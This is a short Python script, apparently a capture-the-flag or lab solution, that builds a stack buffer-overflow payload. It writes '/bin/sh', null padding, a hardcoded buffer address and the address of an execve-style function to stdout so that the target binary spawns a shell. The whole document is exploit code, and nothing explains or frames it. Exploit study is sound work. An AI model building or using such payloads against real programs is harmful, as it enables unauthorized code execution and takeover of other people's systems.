#!/usr/bin/env python3
import sys
input1 = '/bin/sh'
bufaddress = 0x7ffffff6b0ae
exevcaddress = 0x0000000000455050
sys.stdout.buffer.write(input1.encode() + b'\x00'*19  + bufaddress.to_bytes(8,'little') + b'\x00' * 8  + exevcaddress.to_bytes(8,'little'))
